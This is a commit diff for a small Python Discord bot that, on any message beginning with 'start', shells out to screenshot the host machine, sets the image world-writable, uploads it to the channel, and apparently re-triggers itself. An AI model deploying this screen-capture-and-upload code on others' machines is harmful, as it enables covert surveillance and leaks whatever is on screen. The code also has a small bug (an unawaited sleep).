cc01fce7f51ed15beb26c7a3df73007f81000472
theoneslayingadam <125176446+theoneslayingadam@users.noreply.github.com>
2023-02-24 19:28:25 +0700

    Update test.py

--- test.py
+++ test.py
@@ -1,25 +1,30 @@
 import os
 import discord
 import asyncio
+import subprocess
 import nest_asyncio
+
 nest_asyncio.apply()
 intents = discord.Intents().default()
 intents.message_content = True
 client = discord.Client(intents=intents)
 token = "INSERTTOKENHERE"
-async def async_func():
- await asyncio.create_subprocess_shell('scrot screen.png')
-async def async_func1():
- await asyncio.create_subprocess_shell('rm screen.png')
+
+
 @client.event
 async def on_ready():
-    print(f'We have logged in as {client.user}')
+    print(f"We have logged in as {client.user}")
+
+
 @client.event
 async def on_message(message):
- if message.content.startswith('start'):
-  asyncio.run(async_func())
-  await message.channel.send(file=discord.File('screen.png'))
-  asyncio.run(async_func1())
-  asyncio.sleep(0.5)
-  await message.channel.send("start")
+    if message.content.startswith("start"):
+        subprocess.run("scrot screen.png", shell=True)
+        subprocess.run("chmod a+rwx screen.png", shell=True)
+        await message.channel.send(file=discord.File("screen.png"))
+        subprocess.run("rm screen.png", shell=True)
+        asyncio.sleep(0.5)
+        await message.channel.send("start")
+
+
 client.run(token)
